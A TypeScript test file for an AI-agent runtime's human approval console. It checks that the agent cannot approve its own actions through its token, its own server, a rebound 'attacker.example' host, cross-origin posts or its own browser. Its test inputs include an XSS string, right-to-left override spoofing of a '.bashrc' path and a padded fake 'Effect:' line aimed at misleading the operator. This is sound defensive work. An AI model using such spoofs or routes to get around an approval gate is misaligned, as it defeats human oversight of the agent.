// Copyright 2026 XAGI Labs Private Limited
// SPDX-License-Identifier: Apache-2.0

import { randomUUID } from "node:crypto";
import { createServer, request as httpRequest } from "node:http";
import { mkdtempSync, readdirSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { chromium, type Page } from "playwright-core";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import { BrowserOperationSchema, TaskRequestSchema, WorkflowDefinitionSchema } from "@melra/protocol";
import { BrowserRuntime, detectBrowserExecutable } from "@melra/browser-runtime";
import { createMelraRuntime, serveHttp } from "../src/index.js";
import type { MelraHttpServer } from "../src/http-server.js";
import type { MelraRuntime } from "../src/runtime.js";

/**
 * The approval console is `melra console`'s server: a door the agent's server
 * does not have, opened to one browser tab. These tests pin what the docs claim
 * and no more: the server the agent connects to has no approval route, and
 * nothing the agent can do without an approval (its token, its server, reads in
 * a browser attached to the operator's) produces a console approval. Not that
 * the agent cannot approve: anything running as the operator against the data
 * directory still can, with `melra approve --yes`.
 */
describe("approval console", () => {
  let workspace: string;
  let home: string;
  let runtime: MelraRuntime;
  let agent: MelraHttpServer;
  const consoles: MelraHttpServer[] = [];
  const paired: Date[] = [];

  beforeAll(async () => {
    workspace = mkdtempSync(join(tmpdir(), "melra-approve-ws-"));
    home = mkdtempSync(join(tmpdir(), "melra-approve-home-"));
    runtime = await createMelraRuntime({
      workspaceRoot: workspace,
      dataDirectory: home,
      environment: { MELRA_MODE: "enforced" },
    });
    // The agent's endpoint, over the same runtime: its harness holds this token.
    agent = await serveHttp({ runtime, port: 0, token: "agent-token", environment: {} });
  });

  afterAll(async () => {
    for (const server of consoles) await server.close();
    await agent.close();
    await runtime.close();
    rmSync(workspace, { recursive: true, force: true });
    rmSync(home, { recursive: true, force: true });
  });

  const open = async () => {
    const server = await serveHttp({
      runtime,
      port: 0,
      approver: "console:test",
      onPaired: (at) => paired.push(at),
      // Inherited from the agent's harness: never a way in here.
      environment: { MELRA_HTTP_TOKEN: "agent-token" },
    });
    consoles.push(server);
    const code = /#pair=([a-f0-9]{32})$/.exec(server.url)?.[1] ?? "";
    return { server, code, origin: `http://127.0.0.1:${server.port}` };
  };
  const pending = (goal = "Write w.txt\u202e") =>
    runtime.controller.plan(
      TaskRequestSchema.parse({
        goal,
        operation: { kind: "file", action: "write", path: "w.txt", content: "x" },
        requiredEvidence: [{ type: "file_exists", path: "w.txt" }],
      }),
    );
  const decisionFor = (taskId: string) =>
    runtime.controller.approvalDecision(runtime.controller.status(taskId));
  /** A request as any local process can send it: every header its own choice. */
  const call = (
    server: MelraHttpServer,
    path: string,
    init: { method?: string; token?: string; body?: unknown; origin?: string; host?: string; type?: string } = {},
  ) =>
    new Promise<{ status: number; text: string; body: Record<string, unknown>; headers: Record<string, unknown> }>((resolve, reject) => {
      const text = init.body === undefined ? "" : JSON.stringify(init.body);
      const headers: Record<string, string> = {
        host: init.host ?? `127.0.0.1:${server.port}`,
        "content-type": init.type ?? "application/json",
        "content-length": String(Buffer.byteLength(text)),
      };
      if (init.token !== undefined) headers.authorization = `Bearer ${init.token}`;
      if (init.origin !== undefined) headers.origin = init.origin;
      const request = httpRequest(
        // No pooled keep-alive socket: the server, in this same process, can
        // time one out during a slow turn just as the next request is written
        // to it, and the request then fails with ECONNRESET (#296).
        { host: "127.0.0.1", port: server.port, path, method: init.method ?? "GET", headers, agent: false },
        (response) => {
          let data = "";
          response.on("data", (chunk) => (data += chunk));
          response.on("end", () =>
            resolve({
              status: response.statusCode ?? 0,
              headers: response.headers,
              text: data,
              body: data.startsWith("{") ? (JSON.parse(data) as Record<string, unknown>) : {},
            }),
          );
        },
      );
      request.on("error", reject);
      request.end(text);
    });
  const pair = async (server: MelraHttpServer, code: string, origin: string) => {
    const answer = await call(server, "/pair", { method: "POST", origin, body: { code } });
    expect(answer.status).toBe(200);
    return answer.body.session as string;
  };

  it("records an out-of-band decision for the render it showed, and only that one", async () => {
    const { server, code, origin } = await open();
    const token = await pair(server, code, origin);
    const task = pending();
    const shown = await call(server, `/api/tasks/${task.id}/approval`, { token });
    expect(shown.status).toBe(200);
    expect(shown.text).not.toMatch(/"phrase"|APPROVE [a-f0-9]{12}/);
    // Agent text is spelled out, exactly as the terminal screen does it, and
    // the terminal's own reset is not part of a page.
    for (const part of [shown.body.contract, shown.body.summary]) {
      expect(part).toContain("\\u202e");
      expect(part).not.toContain("\u202e");
      expect(part).not.toContain("\u001b");
    }
    expect(shown.body.summary).toMatch(/^Task [^\n]+\nOperation:\n[\s\S]*\nEffect: file\.write on w\.txt /);
    expect(shown.body.renderDigest).toBe(runtime.controller.approvalView(task.id).renderDigest);
    const approve = (renderDigest: unknown, body: { taskId?: string } = { taskId: task.id }) =>
      call(server, `/api/tasks/${task.id}/approve`, { method: "POST", token, origin, body: { ...body, renderDigest } });
    expect(await approve("0".repeat(64))).toMatchObject({ status: 400, body: { error: "approval_render_mismatch" } });
    // The task the page drew, as well as its digest: a post naming another task,
    // or none, is refused.
    for (const body of [{ taskId: pending().id }, {}]) {
      expect(await approve(shown.body.renderDigest, body)).toMatchObject({ status: 400, body: { error: "approval_task_mismatch" } });
    }
    const ok = await approve(shown.body.renderDigest);
    expect(ok.status).toBe(200);
    expect(ok.body.decision).toMatchObject({ channel: "out_of_band", approver: "console:test" });
    expect((await approve(shown.body.renderDigest)).body.error).toBe("approval_already_decided");
    const run = await runtime.controller.execute(task.id);
    expect(run.task.status).toBe("verified_success");
    expect(run.task.approvedBy).toMatchObject({ channel: "out_of_band", approver: "console:test" });
    // Deny cancels, through the same checks.
    const other = pending();
    const denied = await call(server, `/api/tasks/${other.id}/deny`, { method: "POST", token, origin, body: {} });
    expect(denied.body.task).toMatchObject({ status: "cancelled" });
    // One the agent's server started after the page drew it runs, so the deny
    // is refused rather than shown as done.
    const started = pending();
    const view = runtime.controller.approvalView.bind(runtime.controller);
    vi.spyOn(runtime.controller, "approvalView").mockImplementationOnce((taskId) => {
      const drawn = view(taskId);
      runtime.store.saveTask({ ...drawn.task, status: "running" });
      return drawn;
    });
    const late = await call(server, `/api/tasks/${started.id}/deny`, { method: "POST", token, origin, body: {} });
    expect(late).toMatchObject({ status: 400, body: { error: "task_not_cancellable:running" } });
  });

  it("takes nothing the agent holds: its token, the pairing code, or its own server", async () => {
    const { server, code, origin } = await open();
    const task = pending();
    const body = { taskId: task.id, renderDigest: runtime.controller.approvalView(task.id).renderDigest };
    const approve = (token: string) =>
      call(server, `/api/tasks/${task.id}/approve`, { method: "POST", token, origin, body });
    // Before pairing nothing gets in, the code itself included.
    for (const token of ["agent-token", code, ""]) expect((await approve(token)).status).toBe(401);
    const session = await pair(server, code, origin);
    expect(server.token).not.toBe("agent-token");
    for (const token of ["agent-token", code]) expect((await approve(token)).status).toBe(401);
    // Header only: a session in a URL would be one in history and logs.
    expect((await call(server, `/api/tasks?token=${session}`)).status).toBe(401);
    // The agent's server has no approval route and no way to grow one.
    const agentOrigin = `http://127.0.0.1:${agent.port}`;
    for (const path of [`/api/tasks/${task.id}/approve`, `/api/tasks/${task.id}/approval`, "/pair"]) {
      const answer = await call(agent, path, { method: "POST", token: "agent-token", origin: agentOrigin, body });
      expect([404, 405], path).toContain(answer.status);
    }
    // And the console has no MCP endpoint.
    expect((await call(server, "/mcp", { method: "POST", token: session, origin, body: {} })).status).toBe(405);
    expect(decisionFor(task.id)).toBeUndefined();
  });

  it("decides only for its own page: another origin, a rebound name, a form, a GET", async () => {
    const { server, code, origin } = await open();
    const token = await pair(server, code, origin);
    const task = pending();
    const digest = runtime.controller.approvalView(task.id).renderDigest;
    const post = (init: { origin?: string; host?: string; type?: string }) =>
      call(server, `/api/tasks/${task.id}/approve`, { method: "POST", token, body: { taskId: task.id, renderDigest: digest }, ...init });
    // Same site, different port: what an agent's dev server on this machine is.
    expect((await post({ origin: `http://127.0.0.1:${agent.port}` })).status).toBe(403);
    // What a form post sends under no-referrer, and what curl sends.
    expect((await post({ origin: "null" })).status).toBe(403);
    expect((await post({})).status).toBe(403);
    // A body a cross-origin form could send without a preflight.
    expect((await post({ origin, type: "text/plain" })).status).toBe(415);
    expect((await post({ origin, type: "application/x-www-form-urlencoded" })).status).toBe(415);
    // A page rebound to 127.0.0.1 sends its own name in Host and Origin alike,
    // and is refused on every route, the page and pairing included.
    const rebound = `attacker.example:${server.port}`;
    expect((await post({ host: rebound, origin: `http://${rebound}` })).status).toBe(421);
    expect((await call(server, "/", { host: rebound })).status).toBe(421);
    expect((await call(server, "/pair", { method: "POST", host: rebound, origin: `http://${rebound}`, body: { code } })).status).toBe(421);
    expect((await call(server, `/api/tasks/${task.id}/approve?renderDigest=${digest}`, { token })).status).toBe(405);
    // A preflight gets no CORS answer.
    const preflight = await call(server, `/api/tasks/${task.id}/approve`, { method: "OPTIONS", origin: "http://attacker.example" });
    expect(preflight.status).toBe(401);
    expect(Object.keys(preflight.headers).filter((name) => name.startsWith("access-control-"))).toEqual([]);
    expect(decisionFor(task.id)).toBeUndefined();
  });

  it("will not serve approvals on a socket or off loopback, with one answer everywhere", async () => {
    const platform = Object.getOwnPropertyDescriptor(process, "platform")!;
    try {
      // Windows refuses sockets for its own reason, and enforced mode public
      // binds for its own; the console's answer comes first on each.
      for (const os of ["darwin", "linux", "win32"]) {
        Object.defineProperty(process, "platform", { ...platform, value: os });
        await expect(
          serveHttp({ runtime, port: 0, host: "0.0.0.0", approver: "console:test", environment: {} }),
        ).rejects.toThrow("approval_console_loopback_only");
        await expect(
          serveHttp({ runtime, socketPath: join(home, "a.sock"), approver: "console:test", environment: {} }),
        ).rejects.toThrow("approval_console_loopback_only");
      }
    } finally {
      Object.defineProperty(process, "platform", platform);
    }
  });

  it("pairs one tab, once, and only from its own page", async () => {
    const { server, code, origin } = await open();
    const before = paired.length;
    const redeem = (init: { origin?: string; code?: string }) =>
      call(server, "/pair", { method: "POST", body: { code: init.code ?? code }, ...(init.origin === undefined ? {} : { origin: init.origin }) });
    // None of these spends the code.
    expect((await redeem({})).status).toBe(403);
    expect((await redeem({ origin: "null" })).status).toBe(403);
    expect((await redeem({ origin: `http://127.0.0.1:${agent.port}` })).status).toBe(403);
    expect((await redeem({ origin, code: "0".repeat(32) })).status).toBe(403);
    expect(
      (await call(server, "/pair", { method: "POST", origin, type: "text/plain", body: { code } })).status,
    ).toBe(415);
    expect(paired).toHaveLength(before);
    const first = await redeem({ origin });
    expect(first.status).toBe(200);
    expect(first.body.session).toMatch(/^[a-f0-9]{64}$/);
    expect(paired).toHaveLength(before + 1);
    // Spent: the operator's own tab, arriving second, learns it was beaten.
    const second = await redeem({ origin });
    expect(second).toMatchObject({ status: 409, body: { error: "console_already_paired" } });
    expect(second.text).not.toContain(first.body.session as string);
    expect(paired).toHaveLength(before + 1);
  });

  it("never serves the pairing code or the session back, and never stores either", async () => {
    const { server, code, origin } = await open();
    const task = pending();
    const bodies = [(await call(server, "/")).text];
    const session = await pair(server, code, origin);
    const shown = await call(server, `/api/tasks/${task.id}/approval`, { token: session });
    bodies.push(shown.text);
    const approved = await call(server, `/api/tasks/${task.id}/approve`, {
      method: "POST",
      token: session,
      origin,
      body: { taskId: task.id, renderDigest: shown.body.renderDigest },
    });
    expect(approved.status).toBe(200);
    bodies.push(approved.text);
    for (const path of ["/", "/api/capabilities", "/api/tasks", `/api/tasks/${task.id}`, `/api/tasks/${task.id}/receipts`]) {
      bodies.push((await call(server, path, { token: session })).text);
    }
    bodies.push((await call(server, "/pair", { method: "POST", origin, body: { code } })).text);
    for (const body of bodies) {
      expect(body).not.toContain(code);
      expect(body).not.toContain(session);
    }
    const files = (directory: string): string[] =>
      readdirSync(directory, { withFileTypes: true }).flatMap((entry) =>
        entry.isDirectory() ? files(join(directory, entry.name)) : [join(directory, entry.name)],
      );
    for (const file of files(home)) {
      const bytes = readFileSync(file);
      expect(bytes.includes(Buffer.from(code)), file).toBe(false);
      expect(bytes.includes(Buffer.from(session)), file).toBe(false);
    }
  });

  it("pairs and approves in a real browser, whose posts carry the page's own origin", async () => {
    const executablePath = await detectBrowserExecutable();
    if (executablePath === undefined) return;
    const { server, code } = await open();
    const task = pending("Write w.txt</pre><script>alert(1)</script>\u202e");
    const browser = await chromium.launch({ executablePath, headless: true });
    try {
      const page = await browser.newPage();
      const pairing = page.waitForResponse((response) => response.url().endsWith("/pair"));
      await page.goto(server.url);
      // Pairing is a fetch POST that the server refuses unless Origin is this
      // page's: under `no-referrer` a form post would say `null`, so this
      // pins that a same-origin fetch still says who it is.
      await page.getByText(/paired at \d/).waitFor();
      const session = ((await (await pairing).json()) as { session: string }).session;
      expect(session).toMatch(/^[a-f0-9]{64}$/);
      expect(page.url()).not.toContain(code);
      // Held in the page's memory: not in the DOM, and not in storage.
      expect(await page.content()).not.toContain(session);
      expect(await page.evaluate(() => sessionStorage.length + localStorage.length)).toBe(0);
      await page.getByRole("tab", { name: /^Tasks/ }).click();
      await page.locator(`[data-key="${task.id}"]`).click();
      const screen = await page.locator("pre.screen").textContent();
      expect(screen).toContain("</pre><script>alert(1)</script>\\u202e");
      // Clicked once Approve shows as active, the way the operator is shown to.
      // A click that starts while the button is still held makes Playwright
      // retry, and its retries scroll the button into view even when it is in
      // view already; that scroll starts the console's second over, so on a
      // slow runner the press can land inside it and be ignored, as the
      // console means it to be. Any scroll the click needs happens first.
      const approve = page.getByRole("button", { name: "Approve", exact: true });
      await approve.scrollIntoViewIfNeeded();
      await expect.poll(() => approve.getAttribute("aria-disabled"), { timeout: 5_000 }).toBe("false");
      await approve.click();
      await page.getByText("Approved, out of band").waitFor();
      expect(decisionFor(task.id)).toMatchObject({ channel: "out_of_band", approver: "console:test" });
      // A reload is a new page, and only the page that spent the code is paired.
      // The one that left took the session with it: the console refuses it now.
      await page.reload();
      await page.getByText("This page is not paired").waitFor();
      await expect.poll(async () => (await call(server, "/api/tasks", { token: session })).status).toBe(401);
      // A second tab, as the operator's would be after an agent won the race,
      // is told the code is spent and what to do.
      const late = await browser.newPage();
      await late.goto(server.url);
      await late.getByText("Another tab already paired with this console").waitFor();
    } finally {
      await browser.close();
    }
    // The agent's own browser can load the page, which is a read, and act on
    // nothing on it.
    const agentBrowser = new BrowserRuntime({
      workspaceRoot: workspace,
      artifactDirectory: join(home, "artifacts"),
      executablePath,
      allowedDomains: ["127.0.0.1"],
      allowLocalhost: true,
    });
    try {
      const navigate = BrowserOperationSchema.parse({ kind: "browser", action: "navigate", url: `http://127.0.0.1:${server.port}/` });
      await agentBrowser.execute(navigate);
      await expect(
        agentBrowser.execute(
          BrowserOperationSchema.parse({ kind: "browser", action: "click", target: { role: "tab", name: "Overview" } }),
        ),
      ).rejects.toThrow("browser_refuses_approval_surface");
    } finally {
      await agentBrowser.close();
    }
  }, 60_000);

  it("keeps an in-time approval usable after the challenge expires", async () => {
    const executablePath = await detectBrowserExecutable();
    if (executablePath === undefined) return;
    const task = pending("Write approved.txt");
    const view = runtime.controller.approvalView(task.id);
    const expiresAt = new Date(Date.now() - 5_000).toISOString();
    runtime.store.saveTask({ ...task, approval: { ...task.approval!, expiresAt } });
    runtime.store.recordApprovalDecision({
      approvalId: task.approval!.approvalId,
      taskId: task.id,
      renderDigest: view.renderDigest,
      channel: "out_of_band",
      approver: "console:test",
      decidedAt: new Date(Date.parse(expiresAt) - 1_000).toISOString(),
    });
    const browser = await chromium.launch({ executablePath, headless: true });
    try {
      const page = await browser.newPage();
      await page.goto(`http://127.0.0.1:${agent.port}/?token=agent-token#/tasks/${task.id}`);
      await page.getByText(/Approved by console:test/).waitFor();
      expect(await page.getByText(/approval window for this task has closed/i).count()).toBe(0);
    } finally {
      await browser.close();
    }
  }, 60_000);

  it("points an expired workflow approval to advancing its run", async () => {
    const executablePath = await detectBrowserExecutable();
    if (executablePath === undefined) return;
    const run = runtime.workflows.plan(
      WorkflowDefinitionSchema.parse({
        schemaVersion: "1.0.0",
        id: randomUUID(),
        version: 1,
        name: "expired-console-step",
        nodes: [{
          id: "write",
          type: "operation",
          request: TaskRequestSchema.parse({
            goal: "Write retry.txt",
            operation: { kind: "file", action: "write", path: "retry.txt", content: "x" },
            requiredEvidence: [{ type: "file_exists", path: "retry.txt" }],
          }),
        }],
      }),
    );
    await runtime.workflows.advance(run.id);
    const taskId = Object.values(runtime.workflows.status(run.id).nodes).flatMap((node) => node.taskIds)[0]!;
    const task = runtime.controller.status(taskId);
    runtime.store.saveTask({ ...task, approval: { ...task.approval!, expiresAt: new Date(Date.now() - 1_000).toISOString() } });
    const browser = await chromium.launch({ executablePath, headless: true });
    try {
      const page = await browser.newPage();
      await page.goto(`http://127.0.0.1:${agent.port}/?token=agent-token#/tasks/${taskId}`);
      await page.getByText(`melra workflow advance ${run.id}`).waitFor();
      expect(await page.getByText(/Plan it again/).count()).toBe(0);
    } finally {
      await browser.close();
    }
  }, 60_000);

  it("offers to replan or clear an expired standalone approval", async () => {
    const executablePath = await detectBrowserExecutable();
    if (executablePath === undefined) return;
    const task = pending("Write standalone.txt");
    runtime.store.saveTask({ ...task, approval: { ...task.approval!, expiresAt: new Date(Date.now() - 1_000).toISOString() } });
    const browser = await chromium.launch({ executablePath, headless: true });
    try {
      const page = await browser.newPage();
      await page.goto(`http://127.0.0.1:${agent.port}/?token=agent-token#/tasks/${task.id}`);
      await page.getByText(/Plan it again or clear it with/).waitFor();
      expect(await page.getByText(`melra approve ${task.id} --deny`).count()).toBe(1);
    } finally {
      await browser.close();
    }
  }, 60_000);

  it("excludes a usable approval from the overview attention count", async () => {
    const before = await call(agent, "/api/tasks?limit=500", { token: "agent-token" });
    expect(before.body.attentionCount).toEqual(expect.any(Number));
    const task = pending("Write counted.txt");
    const view = runtime.controller.approvalView(task.id);
    const expiresAt = new Date(Date.now() - 5_000).toISOString();
    runtime.store.saveTask({ ...task, approval: { ...task.approval!, expiresAt } });
    runtime.store.recordApprovalDecision({
      approvalId: task.approval!.approvalId,
      taskId: task.id,
      renderDigest: view.renderDigest,
      channel: "out_of_band",
      approver: "console:test",
      decidedAt: new Date(Date.parse(expiresAt) - 1_000).toISOString(),
    });
    const after = await call(agent, "/api/tasks?limit=500", { token: "agent-token" });
    expect(after.body.attentionCount).toBe(before.body.attentionCount);
  });

  const write = (name: string) =>
    TaskRequestSchema.parse({
      goal: `Write ${name}`,
      operation: { kind: "file", action: "write", path: name, content: "x" },
      requiredEvidence: [{ type: "file_exists", path: name }],
    });
  const oneStep = (name: string) =>
    runtime.workflows.plan(
      WorkflowDefinitionSchema.parse({
        schemaVersion: "1.0.0",
        id: randomUUID(),
        version: 1,
        name,
        nodes: [{ id: "write", type: "operation", request: write(`${name}.txt`) }],
      }),
    );
  const expire = (taskId: string) => {
    const task = runtime.controller.status(taskId);
    runtime.store.saveTask({ ...task, approval: { ...task.approval!, expiresAt: new Date(Date.now() - 1_000).toISOString() } });
  };
  /** What the agent's read-only console says of a task, or nothing where no browser is installed. */
  const callouts = async (taskId: string) => {
    const executablePath = await detectBrowserExecutable();
    if (executablePath === undefined) return undefined;
    const browser = await chromium.launch({ executablePath, headless: true });
    try {
      const page = await browser.newPage();
      await page.goto(`http://127.0.0.1:${agent.port}/?token=agent-token#/tasks/${taskId}`);
      await page.locator(".callout").first().waitFor();
      return (await page.locator(".callout").allInnerTexts()).join("\n");
    } finally {
      await browser.close();
    }
  };

  it("never tells an operator to deny a step its run does not name yet (#319)", async () => {
    const run = oneStep("lost-commit");
    // The commit that names the step's task is lost, as workflow-correctness
    // loses it for #319: the task waits under the run's key, the run names none.
    const lost = vi.spyOn(runtime.store, "transitionWorkflow").mockImplementationOnce(() => {
      throw new Error("database is locked");
    });
    await expect(runtime.workflows.advance(run.id)).rejects.toThrow("database is locked");
    lost.mockRestore();
    expect(Object.values(runtime.workflows.status(run.id).nodes).every((node) => node.taskIds.length === 0)).toBe(true);
    const task = runtime.store
      .listTasks(100, "awaiting_approval")
      .find((item) => JSON.stringify(item.request.operation).includes("lost-commit.txt"))!;
    expect(task.idempotencyKey).toBeDefined();
    expire(task.id);
    // A deny would fail the run; its next advance asks again.
    const text = await callouts(task.id);
    if (text !== undefined) {
      expect(text).toContain("melra workflow inspect <workflow-id>");
      expect(text).not.toMatch(/--deny|Plan it again/);
    }
    const state = await call(agent, `/api/tasks/${task.id}/approval-state`, { token: "agent-token" });
    expect(state.body).toMatchObject({ step: true, decision: null });
    expect(state.body.workflowId).toBeUndefined();
  }, 60_000);

  it("tells an expired step of a paused run to resume it, since advance refuses a halted run", async () => {
    const run = oneStep("paused-step");
    await runtime.workflows.advance(run.id);
    const taskId = Object.values(runtime.workflows.status(run.id).nodes).flatMap((node) => node.taskIds)[0]!;
    runtime.workflows.pause(run.id);
    expire(taskId);
    await expect(runtime.workflows.advance(run.id)).rejects.toThrow("workflow_halted:paused");
    const text = await callouts(taskId);
    if (text === undefined) return;
    expect(text).toContain(`melra workflow resume ${run.id}`);
    expect(text).not.toMatch(/melra workflow advance|--deny/);
  }, 60_000);

  it("tells a step approved in time on a paused run that it waits for its run, resumed first", async () => {
    const run = oneStep("decided-paused");
    await runtime.workflows.advance(run.id);
    const taskId = Object.values(runtime.workflows.status(run.id).nodes).flatMap((node) => node.taskIds)[0]!;
    runtime.controller.decide(taskId, runtime.controller.approvalView(taskId).renderDigest, "console:test");
    runtime.workflows.pause(run.id);
    // No agent runs it: only an advance does, and a paused run refuses one.
    await expect(runtime.workflows.advance(run.id)).rejects.toThrow("workflow_halted:paused");
    const text = await callouts(taskId);
    if (text === undefined) return;
    expect(text).toContain("waits for its run to advance");
    expect(text).toContain(`melra workflow resume ${run.id}`);
    expect(text).not.toContain("Waiting for the agent");
  }, 60_000);

  it("tells a step spent in band that its run asks again only once the challenge expires", async () => {
    const run = oneStep("spent-step");
    await runtime.workflows.advance(run.id);
    const taskId = Object.values(runtime.workflows.status(run.id).nodes).flatMap((node) => node.taskIds)[0]!;
    const task = runtime.controller.status(taskId);
    runtime.store.recordApprovalDecision({
      approvalId: task.approval!.approvalId,
      taskId,
      renderDigest: runtime.controller.approvalView(taskId).renderDigest,
      channel: "in_band",
      approver: "cli:developer",
      decidedAt: new Date().toISOString(),
    });
    // Before the challenge expires, an advance leaves the step on it.
    await runtime.workflows.advance(run.id);
    expect(Object.values(runtime.workflows.status(run.id).nodes).flatMap((node) => node.taskIds)).toEqual([taskId]);
    const text = await callouts(taskId);
    if (text === undefined) return;
    expect(text).toContain(`melra workflow inspect ${run.id}`);
    expect(text).toMatch(/asks again once this challenge expires in \d+m/);
    expect(text).not.toMatch(/next advance asks again|melra workflow advance|--deny/);
  }, 60_000);

  it("points an older duplicate under a run's key at inspect, since advancing never takes it up", async () => {
    const run = oneStep("duplicate-step");
    await runtime.workflows.advance(run.id);
    const named = runtime.controller.status(Object.values(runtime.workflows.status(run.id).nodes).flatMap((node) => node.taskIds)[0]!);
    // An earlier challenge under the step's key, as a lost commit then a
    // fresh plan leaves it: the run names the other one.
    const orphan = randomUUID();
    runtime.store.saveTask({
      ...named,
      id: orphan,
      createdAt: new Date(Date.parse(named.createdAt) - 1_000).toISOString(),
      approval: { ...named.approval!, approvalId: randomUUID() },
    });
    expire(orphan);
    await runtime.workflows.advance(run.id);
    expect(runtime.controller.status(orphan).status).toBe("awaiting_approval");
    const text = await callouts(orphan);
    if (text !== undefined) {
      expect(text).toContain(`melra workflow inspect ${run.id}`);
      expect(text).not.toMatch(/melra workflow advance|--deny/);
    }
    const state = await call(agent, `/api/tasks/${orphan}/approval-state`, { token: "agent-token" });
    expect(state.body).toMatchObject({ step: true, workflowId: run.id, named: false });
  }, 60_000);

  it("reads an in-band decision in enforced mode as no answer, as execute and the CLI do", async () => {
    const task = pending("Write in-band.txt");
    const view = runtime.controller.approvalView(task.id);
    // What a developer-mode `melra approve` writes into this data directory.
    runtime.store.recordApprovalDecision({
      approvalId: task.approval!.approvalId,
      taskId: task.id,
      renderDigest: view.renderDigest,
      channel: "in_band",
      approver: "cli:developer",
      decidedAt: new Date().toISOString(),
    });
    expect(decisionFor(task.id)).toBeUndefined();
    expect(() => runtime.controller.decide(task.id, view.renderDigest, "console:test")).toThrow("approval_already_decided");
    const text = await callouts(task.id);
    if (text !== undefined) {
      expect(text).toContain(`melra approve ${task.id} --deny`);
      expect(text).not.toContain("Approve it with");
    }
    const state = await call(agent, `/api/tasks/${task.id}/approval-state`, { token: "agent-token" });
    expect(state.body).toMatchObject({ decision: null, unusable: true, step: false });
    const { server, code, origin } = await open();
    const token = await pair(server, code, origin);
    expect((await call(server, `/api/tasks/${task.id}/approval`, { token })).body).toMatchObject({ unusable: true });
  }, 60_000);

  it("redraws the attention tile when a decision is recorded, which leaves the task row as it was", async () => {
    const executablePath = await detectBrowserExecutable();
    if (executablePath === undefined) return;
    const task = pending("Write decided-later.txt");
    const attention = async () => (await call(agent, "/api/tasks?limit=500", { token: "agent-token" })).body.attentionCount;
    const tileReads = (page: Page, n: unknown) =>
      page.locator(".tile", { hasText: "Need attention" }).locator(".n", { hasText: new RegExp(`^${String(n)}$`) }).waitFor({ timeout: 15_000 });
    const browser = await chromium.launch({ executablePath, headless: true });
    try {
      const page = await browser.newPage();
      await page.goto(`http://127.0.0.1:${agent.port}/?token=agent-token`);
      await tileReads(page, await attention());
      runtime.controller.decide(task.id, runtime.controller.approvalView(task.id).renderDigest, "console:test");
      await tileReads(page, await attention());
    } finally {
      await browser.close();
    }
  }, 60_000);

  it("counts on the attention tile what its filter lists, and says how many more are older", async () => {
    const executablePath = await detectBrowserExecutable();
    if (executablePath === undefined) return;
    const dirs = [mkdtempSync(join(tmpdir(), "melra-window-ws-")), mkdtempSync(join(tmpdir(), "melra-window-home-"))];
    const own = await createMelraRuntime({ workspaceRoot: dirs[0]!, dataDirectory: dirs[1]!, environment: { MELRA_MODE: "enforced" } });
    const server = await serveHttp({ runtime: own, port: 0, token: "window-token", environment: {} });
    const browser = await chromium.launch({ executablePath, headless: true });
    try {
      const old = own.controller.plan(write("old.txt"));
      own.store.saveTask({ ...old, approval: { ...old.approval!, expiresAt: new Date(Date.now() - 1_000).toISOString() } });
      // The console loads the newest 500, so this pushes the expired one past them.
      for (let index = 0; index < 500; index += 1) {
        own.controller.plan(TaskRequestSchema.parse({ goal: "Read r.txt", operation: { kind: "file", action: "read", path: "r.txt" }, requiredEvidence: [] }));
      }
      const page = await browser.newPage();
      await page.goto(`http://127.0.0.1:${server.port}/?token=window-token`);
      const tile = page.locator(".tile", { hasText: "Need attention" });
      await tile.waitFor();
      expect((await tile.innerText()).replace(/\s+/g, " ").trim()).toBe("0 Need attention 1 more older than the newest 500");
      await tile.click();
      await page.getByRole("button", { name: "Needs attention 0" }).waitFor();
    } finally {
      await browser.close();
      await server.close();
      await own.close();
      for (const dir of dirs) rmSync(dir, { recursive: true, force: true });
    }
  }, 120_000);

  it("draws MELRA's summary right above the buttons, and the agent's text as text", async () => {
    const executablePath = await detectBrowserExecutable();
    if (executablePath === undefined) return;
    const { server } = await open();
    // A right-to-left override that would show this path as cfg/.bashrc, and
    // a stack of combining marks that would draw over the lines around it.
    const task = runtime.controller.plan(
      TaskRequestSchema.parse({
        goal: "Save the config\u0301\u0302\u0303\u0304\ufff0",
        operation: { kind: "file", action: "write", path: "cfg/‮crhsab.\ufff0", content: "x" },
      }),
    );
    const browser = await chromium.launch({ executablePath, headless: true });
    try {
      const page = await browser.newPage({ viewport: { width: 1440, height: 900 } });
      await page.goto(server.url);
      await page.getByText(/paired at \d/).waitFor();
      await page.getByRole("tab", { name: /^Tasks/ }).click();
      await page.locator(`[data-key="${task.id}"]`).click();
      const approve = page.getByRole("button", { name: "Approve", exact: true });
      await approve.waitFor();
      // What sits right above the buttons is MELRA's summary, whole: not a
      // scroll box opened at the top of the agent's contract.
      const above = await approve.evaluate((button) => {
        const block = button.parentElement!.previousElementSibling as HTMLElement;
        return { tag: block.tagName, text: block.innerText, clipped: block.scrollHeight > block.clientHeight };
      });
      expect(above).toMatchObject({ tag: "PRE", clipped: false });
      expect(above.text).toMatch(/^Task [\s\S]*\nEffect: file\.write on [^\n]*\nGoal [^\n]*\nContract digest: [a-f0-9]{64}\n?$/);
      // The contract is there too, folded, above it.
      expect(await page.locator("details pre", { hasText: '"contractVersion"' }).count()).toBe(1);
      // Nothing hidden that the agent sent reaches the page as itself: not the
      // list row, the request's target, or the stored record either.
      const drawn = (await page.locator("#view").textContent()) ?? "";
      expect(drawn).toContain("cfg/\\u202ecrhsab.");
      expect(drawn).not.toMatch(/\p{Cf}/u);
      expect(drawn).toContain("config\u0301\u0302\\u0303\\u0304\\ufff0");
      expect(drawn).not.toMatch(/[\p{Mn}\p{Me}]{3}/u);
      // Raw nowhere, including what the page draws on its own (the list row).
      expect(drawn).not.toMatch(/\p{Cn}/u);
    } finally {
      await browser.close();
    }
  }, 60_000);

  it("indents whatever wraps in the summary, so agent text cannot stand at its left edge", async () => {
    const executablePath = await detectBrowserExecutable();
    if (executablePath === undefined) return;
    const { server } = await open();
    // Spaces let the browser wrap the rest onto a line of its own, which
    // would otherwise start at the left edge, where MELRA's Effect line is.
    const task = runtime.controller.plan(
      TaskRequestSchema.parse({
        goal: "Save notes",
        operation: {
          kind: "file",
          action: "write",
          path: "w.txt",
          content: "x" + " ".repeat(100) + "Effect: file.read on notes.txt (read, low risk)",
        },
        requiredEvidence: [{ type: "file_exists", path: "w.txt" }],
      }),
    );
    const browser = await chromium.launch({ executablePath, headless: true });
    try {
      const page = await browser.newPage({ viewport: { width: 1280, height: 900 } });
      await page.goto(server.url);
      await page.getByText(/paired at \d/).waitFor();
      await page.getByRole("tab", { name: /^Tasks/ }).click();
      await page.locator(`[data-key="${task.id}"]`).click();
      await page.getByRole("button", { name: "Approve", exact: true }).waitFor();
